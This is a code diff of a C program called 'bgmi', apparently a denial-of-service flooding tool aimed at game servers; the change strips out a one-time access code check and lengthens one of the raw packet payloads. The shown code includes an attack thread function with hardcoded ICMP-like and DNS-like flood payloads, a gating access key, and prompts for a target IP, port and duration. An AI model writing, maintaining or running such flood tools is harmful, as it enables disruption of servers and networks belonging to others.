@@ -10,7 +10,6 @@
 #define EXPIRATION_MONTH 12
 #define EXPIRATION_DAY 31
 #define ACCESS_KEY "VIP-AGEON"
-#define OTAC_FILE "otac.txt"
 
 // Structure for attack data
 struct thread_data {
@@ -59,7 +58,8 @@ void *attack(void *arg) {
         "\x08\x00\xf7\xff\x00\x01\x00\x01"
         "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x70\x71\x72\x73\x74\x75\x76"
         "\x77\x78\x79\x7a\x61\x62\x63\x64\x65\x66\x67\x68\x69\x70\x71\x72"
-        "\x73\x74\x75\x76\x77\x78\x79\x7a",
+        "\x73\x74\x75\x76\x77\x78\x79\x7a\x61\x62\x63\x64\x65\x66\x67\x68"
+        "\x69\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a",
 
         // Custom DNS-like payload (large)
         "\x12\x34\x81\x80\x00\x01\x00\x01\x00\x00\x00\x00\x03\x77\x77\x77"
@@ -101,62 +101,15 @@ void *attack(void *arg) {
     pthread_exit(NULL);
 }
 
-// Save OTAC to a file
-void save_otac_to_file(char *otac) {
-    FILE *file = fopen(OTAC_FILE, "w");
-    if (file == NULL) {
-        perror("Failed to open OTAC file");
-        exit(1);
-    }
-    fprintf(file, "%s", otac);
-    fclose(file);
-}
-
-// Read OTAC from a file
-int read_otac_from_file(char *otac) {
-    FILE *file = fopen(OTAC_FILE, "r");
-    if (file == NULL) {
-        return 0;
-    }
-    fscanf(file, "%s", otac);
-    fclose(file);
-    return 1;
-}
-
-// Delete the OTAC file after use
-void delete_otac_file() {
-    remove(OTAC_FILE);
-}
-
-// Generate a random alphanumeric OTAC
-void generate_access_key(char *key, int n) {
-    static const char alphanum[] = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
-    srand(time(NULL));
-    for (int i = 0; i < n; i++) {
-        key[i] = alphanum[rand() % (sizeof(alphanum) - 1)];
-    }
-    key[n] = '\0';  // Null-terminate the string
-}
-
 // Command usage help
 void usage() {
     printf("Usage:\n");
-    printf("  ./bgmi generate-key   - Generate a new one-time access code (OTAC)\n");
-    printf("  ./bgmi                - Run the program and provide the access key and OTAC interactively\n");
+    printf("  ./bgmi                - Run the program and provide the access key interactively\n");
     exit(1);
 }
 
 // Main function
 int main(int argc, char *argv[]) {
-    // Handle command-line arguments for generating key or running the program
-    if (argc == 2 && strcmp(argv[1], "generate-key") == 0) {
-        char access_key[16];
-        generate_access_key(access_key, 15);
-        save_otac_to_file(access_key);
-        printf("OTAC generated: %s\n", access_key);
-        return 0;
-    }
-
     if (argc != 1) {
         usage();
     }
@@ -170,25 +123,6 @@ int main(int argc, char *argv[]) {
         printf("Error: Invalid access key. Access denied.\n");
         exit(1);
     }
-
-    // Ask for the OTAC interactively
-    char otac[20];
-    if (!read_otac_from_file(otac)) {
-        printf("Error: OTAC not found or already used. Please generate a new one.\n");
-        exit(1);
-    }
-
-    char provided_otac[20];
-    printf("Enter OTAC: ");
-    scanf("%s", provided_otac);
-
-    if (strcmp(provided_otac, otac) != 0) {
-        printf("Error: Invalid OTAC. Access denied.\n");
-        exit(1);
-    }
-
-    // Invalidate the OTAC after use
-    delete_otac_file();
 
     // Ask for IP, port, and time interactively
     char ip[20];
